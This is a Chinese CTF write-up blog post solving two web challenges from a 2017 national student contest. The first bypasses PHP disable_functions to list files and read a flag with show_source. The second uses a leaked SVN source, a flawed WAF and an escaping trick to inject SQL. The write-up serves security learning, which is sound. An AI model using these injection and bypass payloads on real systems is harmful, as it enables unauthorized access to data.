---
title: 国赛的两个Web题
date: 2017-09-10 15:58:56
tags:
	- CTF
	- 全国大学生信息安全竞赛
	- Writeup
---
在全国大学生信息安全竞赛(线上赛)上划了波水，对我来说题目挺难的，好多姿势都没见过。
<!-- more -->

## 0x00 两个最简单的Web的题解


### Web-PHP execise
这个题目考察了PHP的几个简单的语法
首先在题目中执行phpinfo()函数
![image](http://osn75zd5c.bkt.clouddn.com/Web-PHPexcise-1.png)
在其中的找到被禁用的函数

```
disable_functions
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,file,readfile,opendir,readdir,closedir,rewinddir,
```
然后通过getcwd()函数获取服务器当前目录路径
```
echo getcwd()
```
![image](http://osn75zd5c.bkt.clouddn.com/Web-PHPexcise-2.png)
从而获取路径

```
/var/www/html
```
然后获取当前目录下的所有文件的文件名
```
$dir="/var/www/html";print_r(scandir($dir))
```
![image](http://osn75zd5c.bkt.clouddn.com/Web-PHPexcise-3.png)
判断flag在flag_62cfc2dc115277d0c04ed0f74e48e3e9.php这个文件中，但是PHP几乎所有对文件操作的函数都被禁用了。在这时想到了以前表哥们给我们出题的时候，有的Web题的源码直接显示在网页上了，利用的show_source()函数.于是乎：

```
include"flag_62cfc2dc115277d0c04ed0f74e48e3e9.php";show_source("flag_62cfc2dc115277d0c04ed0f74e48e3e9.php")
```
从而获取flag

![image](http://osn75zd5c.bkt.clouddn.com/Web-PHPexcise-4.png)

### Web-wanna to see your hat?
这题有毒，不拿到flag就给你10个绿帽子。。(╯‵□′)╯︵┻━┻

主要考察的代码审计和SQL注入。首先有一个SVN源码泄露漏洞，利用工具将网站所有的源码下载下来，进行审计。关键代码如下:

```
$_POST=d_addslashes($_POST);
$_GET=d_addslashes($_GET);
function d_addslashes($array){
        foreach($array as $key=>$value){
        if(!is_array($value)){
            !get_magic_quotes_gpc() && $value=addslashes($value);
            waf($value);
            $array[$key]=$value;
        }   
    }   
    return $array;
}
function waf($value){
    $Filt = "\bUNION.+SELECT\b|SELECT.+?FROM";
    if (preg_match("/".$Filt."/is",$value)==1){
        die("found a hacker");
    }
    $value = str_replace(" ","",$value);  
    return $value;
}
if (isset($_POST["name"])){
  $name = str_replace("'", "", trim(waf($_POST["name"])));
  if (strlen($name) > 11){
    echo("<script>alert('name too long')</script>");
  }else{
    $sql = "select count(*) from t_info where username = '$name' or nickname = '$name'";
    echo $sql;
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    if ($row[0]){
      $_SESSION['hat'] = 'black';
      echo 'good job';
    }else{
	$_SESSION['hat'] = 'green';
    }
```
最终目的是令$_SESSION['hat'] = 'black';这也就意味着在执行SQL语句时，可以返回数据。但是，在register.php的插入语句为

```
$sql = "insert into t_user (username,nickname,password) values('".$_POST['username']."', '".$_POST['nickname']."','".md5($_POST['password'])."')";
```
它注册时写入数据的表与登陆时查询的表不是一个，这也把我的思路带偏了，我一开始认为，在register.php里面构造语句在t_info表中插入数据。但根据查到的资料显示，SQL只允许一个插入语句对一个表操作。没辙了。。去请教表哥们。
关键点在login.php，即登录界面。
关键语句
```
$name = str_replace("'", "", trim(waf($_POST["name"])));
```
在POST传入name时，如果传进的字符串中有“'”单引号，则会被加上反斜杠进行转义，然后在waf里面，若有空格则会被去掉。然后“\'”中的单引号被去掉，成为了“\”,若这个反斜杠在结尾，则会把 
```
$sql = "select count(*) from t_info where username = '$name' or nickname = '$name'";
```
第一个name的第二个单引号转义，导致

```
$name' or nickname =
```
成为了字符串。因此令

```
name==(0)=1#'
```
最终执行的SQL语句为
```
$sql = "select count(*) from t_info where username = '=(0)=1#\' or nickname = '=(0)=1#\'";
```
该语句为真，因此返回数据，使得$_SESSION['hat'] = 'black';从而返回flag
![image](http://osn75zd5c.bkt.clouddn.com/Web-green-1.png)
